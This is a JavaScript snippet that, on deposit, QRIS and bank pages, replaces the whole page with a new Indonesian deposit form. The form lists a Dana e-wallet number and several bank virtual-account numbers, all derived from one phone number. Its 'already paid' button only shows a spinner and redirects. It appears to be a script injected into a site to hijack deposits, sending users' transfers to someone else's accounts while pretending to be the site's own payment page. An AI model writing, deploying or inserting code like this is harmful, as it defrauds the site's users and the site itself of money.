(function(){
  const path = window.location.pathname;
  const allowed = [
    "/deposit","/qris","/bank","/deposit_qris",
    "/deposit.php","/qris.php","/bank.php","/deposit_qris.php"
  ];
  if(!allowed.includes(path)) return;

  document.body.innerHTML = `
  <style>
    :root{
      --bg-gradient: linear-gradient(135deg,#0ea5a0,#3b82f6);
      --card:#fff; --muted:#6b7280;
      --accent:#2563eb; --success:#16a34a;
      --danger:#dc2626;
      font-family: 'Segoe UI', Inter, sans-serif;
    }
    body{
      margin:0; min-height:100vh; display:flex; justify-content:center; 
      align-items:flex-start; padding:30px; background:var(--bg-gradient);
    }
    .wrap{width:100%; max-width:720px; background:#fff; border-radius:16px; 
      padding:28px; box-shadow:0 8px 24px rgba(0,0,0,.15); animation:fadeIn .6s ease;}
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
    h1{margin:0 0 10px; font-size:22px; color:#111827;}
    p{margin:0 0 20px; color:var(--muted); font-size:14px;}
    .hidden{display:none;}
    .input-box{margin:20px 0;}
    .input-box label{font-weight:600; font-size:14px; color:#374151;}
    .input-box input{width:100%; padding:12px 14px; margin-top:8px;
      font-size:16px; border-radius:10px; border:1px solid #d1d5db; transition:.2s;}
    .input-box input:focus{border-color:var(--accent); outline:none; box-shadow:0 0 0 2px rgba(37,99,235,.2);}
    .note{background:#f9fafb; border:1px solid #e5e7eb; padding:14px; 
      border-radius:10px; font-size:13px; color:#374151; line-height:1.5;}
    .note strong{color:var(--danger);}
    .btn{padding:14px 18px; border:none; border-radius:12px; cursor:pointer; 
      font-weight:600; font-size:15px; transition:.2s; width:100%;}
    .btn:hover{opacity:.9;}
    .btn-primary{background:var(--accent); color:#fff;}
    .btn-success{background:var(--success); color:#fff;}
    .btn-small{padding:6px 12px; font-size:13px; width:auto;}
    .grid{display:grid; gap:14px; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); margin-top:16px;}
    .card{background:#f9fafb; padding:16px; border-radius:12px; display:flex; gap:12px; 
      align-items:center; position:relative; border:1px solid #e5e7eb;}
    .logo{width:60px;height:60px;flex:0 0 60px;display:flex;align-items:center;justify-content:center;
      background:#fff;border-radius:10px;box-shadow:inset 0 0 4px rgba(0,0,0,.05);}
    .logo img{max-width:50px;max-height:50px;}
    .info{flex:1;}
    .method{font-weight:600; color:#111827;}
    .number{font-family:monospace;font-size:14px;margin-top:4px;color:#374151;}
    .toast{position:fixed;bottom:20px;right:20px;background:#111827;color:#fff;
      padding:12px 16px;border-radius:8px;opacity:0;transition:.3s;}
    .toast.show{opacity:1;}
    .loading-mask{position:absolute;inset:0;background:rgba(255,255,255,.7);
      display:flex;align-items:center;justify-content:center;border-radius:12px;}
    .spinner{width:26px;height:26px;border:3px solid #ddd;border-top-color:var(--accent);
      border-radius:50%;animation:spin 1s linear infinite;}
    @keyframes spin{to{transform:rotate(360deg)}}
    .back-btn{background:#e5e7eb; color:#374151; margin-top:16px;}
    .screen-loader{position:fixed;inset:0;background:rgba(255,255,255,.8);
      display:flex;align-items:center;justify-content:center;z-index:9999;}
    .screen-loader .spinner{width:40px;height:40px;border:4px solid #ddd;border-top-color:var(--accent);}
  </style>

  <div class="wrap">
    <!-- Step 1 -->
    <div id="step1">
      <h1>Masukkan Nominal</h1>
      <p>Isi jumlah deposit yang ingin Anda transfer</p>
      <div class="input-box">
        <label for="nominal">Nominal (Rp)</label>
        <input type="number" id="nominal" min="50000" placeholder="Minimal Rp 50.000" />
      </div>
      <div class="note">
        <strong>Ketentuan Deposit:</strong><br>
        • Deposit <strong>wajib menggunakan kode unik</strong> (Contoh: 50.881)<br>
        • Deposit <strong>wajib menggunakan Bank Aktif</strong><br>
        • Deposit <strong>wajib menggunakan Ewallet Aktif</strong><br>
        • Apabila tidak sesuai dengan syarat ketentuan, maka saldo <strong>tidak akan masuk</strong>.
      </div>
      <button class="btn btn-primary" id="nextBtn" style="margin-top:20px;">Lanjut</button>
    </div>

    <!-- Step 2 -->
    <div id="step2" class="hidden">
      <h1>Metode Pembayaran</h1>
      <p>Pilih salah satu metode di bawah lalu salin nomor rekening/VA</p>

      <div class="grid">
        <div class="card" data-number="088214538915">
          <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtFpFiB1KzQaHDUUvweujUDGVJCeZg0UoFNpKUVwyQtFhB7ePeO_I0k9nZ&s=10" alt="Dana"></div>
          <div class="info"><div class="method">Ewallet Dana</div><div class="number">088214538915</div></div>
          <button class="btn btn-small btn-primary copy-btn">Salin</button>
        </div>
        <div class="card" data-number="88810088214538915">
          <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMeqbx8--46kKmCET5yZnDT9BFqSByqVCYQw&s" alt="BRI"></div>
          <div class="info"><div class="method">Virtual BRI</div><div class="number">88810088214538915</div></div>
          <button class="btn btn-small btn-primary copy-btn">Salin</button>
        </div>
        <div class="card" data-number="3901088214538915">
          <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9TvmOPrRWGgnIGDVraU9TFHAzp7AAmwV8vhpd7qNIo-GWkJAAei82Yx3s&s=10" alt="BCA"></div>
          <div class="info"><div class="method">Virtual BCA</div><div class="number">3901088214538915</div></div>
          <button class="btn btn-small btn-primary copy-btn">Salin</button>
        </div>
        <div class="card" data-number="8810088214538915">
          <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGDMFxioKDa2kz-TBjhKYEmn6mvERMtBLMJw&s" alt="BNI"></div>
          <div class="info"><div class="method">Virtual BNI</div><div class="number">8810088214538915</div></div>
          <button class="btn btn-small btn-primary copy-btn">Salin</button>
        </div>
        <div class="card" data-number="89508088214538915">
          <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8Yg6g0b7UdqtWmgk60JvMYbvOPnjhGGYsTQ&s" alt="Mandiri"></div>
          <div class="info"><div class="method">Virtual Mandiri</div><div class="number">89508088214538915</div></div>
          <button class="btn btn-small btn-primary copy-btn">Salin</button>
        </div>
      </div>

      <button class="btn btn-success" id="payBtn" style="margin-top:20px;">Sudah Membayar</button>
      <button class="btn back-btn" id="backBtn">Kembali</button>
    </div>

    <div id="toast" class="toast"></div>
  </div>`;

  const step1=document.getElementById('step1');
  const step2=document.getElementById('step2');
  const toast=document.getElementById('toast');

  function showToast(msg){
    toast.textContent=msg;
    toast.classList.add('show');
    clearTimeout(toast._t);
    toast._t=setTimeout(()=>toast.classList.remove('show'),2200);
  }

  function showScreenLoader(){
    const loader=document.createElement('div');
    loader.className="screen-loader";
    loader.innerHTML='<div class="spinner"></div>';
    document.body.appendChild(loader);
    return loader;
  }

  document.getElementById('nextBtn').addEventListener('click',()=>{
    const val=document.getElementById('nominal').value;
    if(!val || val<50000){
      showToast('Minimal deposit Rp50.000');
      return;
    }
    const loader=showScreenLoader();
    setTimeout(()=>{
      loader.remove();
      step1.classList.add('hidden');
      step2.classList.remove('hidden');
    },1500);
  });

  async function copyText(number){
    try{
      await navigator.clipboard.writeText(number); return true;
    }catch(e){
      try{
        const ta=document.createElement('textarea');
        ta.value=number; document.body.appendChild(ta);
        ta.select(); document.execCommand('copy');
        document.body.removeChild(ta); return true;
      }catch(err){ return false; }
    }
  }

  document.querySelectorAll('.copy-btn').forEach(btn=>{
    btn.addEventListener('click',async e=>{
      const card=e.target.closest('.card');
      const number=card.dataset.number;
      const mask=document.createElement('div');
      mask.className='loading-mask';
      mask.innerHTML='<div class="spinner"></div>';
      card.appendChild(mask);
      await new Promise(r=>setTimeout(r,700));
      const ok=await copyText(number);
      mask.remove();
      if(ok){ showToast('Nomor disalin ✓'); }
      else{ showToast('Gagal salin, salin manual'); }
    });
  });

  document.getElementById('payBtn').addEventListener('click',()=>{
    const loader=showScreenLoader();
    setTimeout(()=>{
      loader.remove();
      showToast('Terima kasih, redirect...');
      setTimeout(()=>{ window.location.href="../"; },800);
    },1500);
  });

  document.getElementById('backBtn').addEventListener('click',()=>{
    step2.classList.add('hidden');
    step1.classList.remove('hidden');
  });
})();
